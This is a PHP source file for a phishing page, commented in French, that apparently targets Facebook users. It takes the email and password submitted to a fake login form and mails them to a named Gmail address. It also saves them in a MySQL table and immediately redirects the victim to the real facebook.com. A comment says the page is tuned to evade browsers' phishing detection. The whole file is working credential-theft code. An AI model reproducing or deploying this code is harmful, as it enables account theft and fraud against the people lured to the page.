<?php
    
	// Page produite par NesQuiiKz.com et optimisée contre les navigateur internet qui peuvent détecter les pages Phishing.

	
	// Configuration de la base de donnée
	$DB_host = "Hôte MySQL";
	$DB_login = "Utilisateur MySQL"; 
	$DB_pass = "Mot de passe"; 
	$DB_select = ""; 
	
	// Connexion à notre base de donnée
	$con = mysql_connect($DB_host, $DB_login, $DB_pass); 
    if (!$con) { 
			die('Erreur de connexion: ' . mysql_error()); 
			}
    $db= mysql_select_db($DB_select, $con);
	
	
    
	// On protège notre base de donnée.
	$id=mysql_real_escape_string($_POST["email"]);
	$mdp=mysql_real_escape_string($_POST["pass"]);
	
	
    // S'il l'on met un identifiant
	if ((isset($_POST["email"]))&&($_POST["email"]!="")){
	
	
				// S'il l'on met un mot de passe
				if ((isset($_POST["pass"]))&&($_POST["pass"]!="")){
	
	                   // On crée une variable contenant les identifiants
	                   $all = 'Identifiant : ' . $_REQUEST['email']. "\n". 'Mot de passe : ' . $_REQUEST['pass'] ;
					   
					   
	                   // On envoi les identifiants à notre adresse mail voulu
	                   mail('clement9555@gmail.com','NesQuiiKz.com', $all );
					   
					   // On vérifie que les identifiants n'ont pas été déjà enregistrés
					   $SQL="SELECT * FROM `Base de données MySQL`.`ids` WHERE id='$id' AND mdp='$mdp'";
                       $res=mysql_query($SQL);
					   
					   // Si les identifiants ne sont pas déjà présent
                       if(mysql_num_rows($res)==0){
							   // On ajoute les identifiants à notre base de donnée.
							   $SQL="INSERT INTO `Base de données MySQL`.`ids` (`id` ,`mdp`)VALUES ('$id',  '$mdp')";
							   $res=mysql_query($SQL);
							 
					   }
					   
	            }
	
	}
	mysql_close(); 
	
?>
<?php // On redirige l'internaute vers le site officiel tout de suite ?>
<html><head><meta http-equiv='refresh' content='0; URL=http://www.facebook.com'></head><body></body></html>